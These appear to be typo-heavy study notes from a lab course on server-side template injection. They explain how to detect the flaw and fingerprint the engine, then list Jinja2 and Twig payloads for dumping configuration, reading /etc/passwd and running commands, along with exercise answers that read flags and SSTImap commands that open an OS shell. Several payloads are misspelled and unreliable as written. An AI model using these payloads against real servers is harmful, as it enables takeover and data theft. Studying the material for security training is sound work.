# Template Engine:
A template engine is sofware that combines pre-defined templatess with dynamically generate data and is often used by web app to generate
dynamically responses. AN everyday use case for template engines is a website with shared and foorters for all pages. A template can dynamically
add content but keep the header and footer the same.
This avoid duplicate instances of header and footer in differents places reducing complexity and thus enabling better code maintainability.
The most popular are [Jinja](https://jinja.palletsprojects.com/en/stable/) [Twing](https://twig.symfony.com/)

- Templating:
Template engines typically require two inputs: a template and set of values to be inserted to the template. The template can typically be provided
as a string or a file and contains pre-defined places where the template engine inserts the dynamically generated values.
The values are provided ad key-value pairs so the template engine can place the provided value at the location in the template marked with the corresponding
key. Generating a string form the input template and input value is called rendering.
Jinja `Hello{{name}}!`
It contains a single variable called name, which is replace with a dynamically value during rendering. When the template is rendered, must be provide with a value for thge variable name
IF we provide the variable [name="Albert"] to the rendering funtions, the template engine will generate the follo string:
`hello Albert`

While the above is simplistic example, many modern template engines support more complex operations typically provided by programming, such conditions loops. Consider the following string
```jinja2
{% for name in names %}
Hello {{name}}!
{% endfor %}
```
The template contains a for-loop that loops ovewr all elements in a variable name. We need to provide the rendering funtion with an object in the names variable that it can iterate over.
If we pass the funtion with a list such as [names=["Alicia","Rosa","Eric"]], the themplate will generate the string.

# Introduction to SSTI:
This injection occurs when the attacker can inject templating code into a template that is later render y the server, if an attacker inject malicius code, the server
potentially executes the code during the rendering process, enabling an attacker to take over the server completely.

- Server-side Template Injection:
AS we have seen, the rendering of templates inherently deals with dynamically values provided to the template engine during rendering. These dynamically value are provided by the user. Templates engine
can deal with user input securely if provided as value to the rendering funtions. That is cuase template engine insert the value into the corresponding places in the template and fo not
run any code within the values. SSTI occurs when a attacker can control the template parameter, as template engines run code provided in the template.

If templating is implemented correctly, user input is always provided to the rendering funtions in values an never in the template string. SSTI occur when user input is inserted into the template
before rendering funtion called ont the template. A different instance would be is a web app ccall thge rendering funtion on the same template multiple times.

# Identifying SSTI:
Is essential to succesfully confirm that the vulnerability is present, we need to identify the template engine the target web app uses, as the exploiting proccess highy on the concrete template engine in use.
- Confirming SSTI:
The process of identifying aan SSTI vulnerability is similar to the process of identifyung any other injection vulnerability, Sql injection. The most effective way is
to inject special characters with semantic meaning in template engine and observe the web app behavior. The following test string is commonly used to provoke an error message in a web app vulnerable SSTI, as
it consist of all special characters that have a particular semantic purpouse in popular template engine [${{<%[%'"}}%\.]S

Since the above test string should almost certainly violate the template syntax, it should result an error if the web app is vulnerable to SSTI, The behavior is similar to how injecting a single quote ' into web
app vulnerable to SQL injection can break an SQL query's sysntax and thus result in a SQL error.

- Indentiying the template engine:
To enable the successful explotation of an SSTI vulnerability, we first need to determine the template engine used by the web app. We can utilize slight variations in the behavior of different template engines
to achieve this. Consider the commonly user overview containing slight difference in popular templates:
![Schema](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)

We will start by injecting the payload [$7*7] and follow the diagram from the left, depending on the result of the injection. Suppose the
injection resulted in a successful execution of the injected payload.
This time the payload was execute by the template engine, We follow the green narrow and inject th payload [{{7*'7'}}].
Result will enable is the deduce the template engine used by the web app. The reult will be 7777777 while in Twing. The rusult will be 49.

Exercise:
Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.

# Exploiting SSTI - Jinja2:
Now that we have seen how to identify the template engine used by a web app vulnerable to SSTI, we will move on to th explotation of SSTI. We will assume
that we have successfully identified that the web app uses the Jinja template engine. We will only focus on the SSTI explotation and this assume that the SSTI and template
engine idenitification have already been done in prev.

Junja is a template commonly  used in Pythion web framework might thus be slingtly different.
In our payload we can freeky use any libraries that are already imporated by th Python app, either directly or indirectly. We may be able to import additional librearies
through the use of the imporat statement.

- Information Disclosusre:
We can exploit the SSTI vulnerability to obtain internal information about the web app, icluding configuration details and the web app source code. We can obtain the web app conf using the payload:
`{{config.items()}}`
Since this payload dump the entire web app configuration, including any used secret keys, we can prepare futher attacks using the obtained information. We can also execute pyton code
to obtain informationa about the web app sorce code, we can use the payload.
`{{ self.__init__.__globals__.__builtins__ }}`

- Local File inclusion(LFI)
We can use python's built-in funtions open to include a local file, we cannot call the funtion directly; we need to call it from the __builtins__ dictionary we dumped earlier.
`{{self.__init__.__globals__.__builtins__.open("/ftc/passwd").read()}}`
- Remote Code Execution (RCE):
To archieve remote code execution in py, we can use funtions provided by th os, libary as system or popen. If web app has not imported this library, we must first, import ut by calling
the built-in funtions import. THis results in the following SSTI payloads:
`{{self.__init__.__globals__.__builtins__.import__('os').popen('id').read() }}`

Exercise:
Exploit the SSTI vulnerability to obtain RCE and read the flag:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`

# Exploting SSTI - Twig
Twig is a template engine fo the PHP programing lenguage.
- Information Disclosure:
We can use _self to obtain a little information about the current template:
`{{_self}}`
- Local file injection LFI:
Reading local file is not possible using the internal funtions directly provided by twig, the php web framework [Symfony](https://symfony.com/) defines additional filter. One og these is
[file_expept](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
`{{"/etc/passwd"|file_expept(1,-1) }}`
- Remote code Exection:
We can use a PHP built-in funtion such a system. We can pass an argurment to this funtions by using twig's filter funtions, resulting in any of the following payloads:
`{{ ['id'] | filter('system') }}`

- Further Remarks:
The general idea behind SSTI remains the same, exploting in a template engine the attacker is unfamiliar with is often as simple as becoming familiar with the syntax.
[Server-Side-template-Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

Exercise:
Exploit the SSTI vulnerability to obtain RCE and read the flag:
`{{ ['cat ../../../flag.txt '] | filter('system') }}`

# SSTI Tools of the trade & preventing SSTI:
The most popular tools are [tplmap](https://github.com/epinna/tplmap). Is not maintained anymore and runs on the deprecated Python2 version. We will more use modern [SSTlmap](https://github.com/vladko312/SSTImap) to
aid the SSTI explotation proccess.
`python3 sstimap` or `sstimap`

Usage:
`sstimap.py -u http://172.17.0.2/index.php?name=test`
and We can confirms the SSTI vulnerability and successfully identifies the Twig template engine. Also provides capabilities we can us during the explotation. We can download a remote file to our local machine using -D:
`sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd`
We can execute a system command using -S flag:
`sstimap.py -u http://172.17.0.2/index.php?name=test -S id`
Also the flag --os-shell to interactive shell:
`sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell`

- Prevention:

To prevent  SSTI vulnerability, we must ensure that user input is never fed into the call to the template engine's rendering funtions in the template parameter. This can be achieve by carefully going through the different code paths
ensuring that user input is never added to a template before call to the rendering funtion.
We app intends to have users modify existing templates or uplaod new ones for bussines reasons, it's crucial to implemetn proper handening measure to prevent the takeover ot the web server. This process can include hardening the template
engine by removing potentially dangerous funtions that can be used to achieve remote code execution form teh execution enviroment.
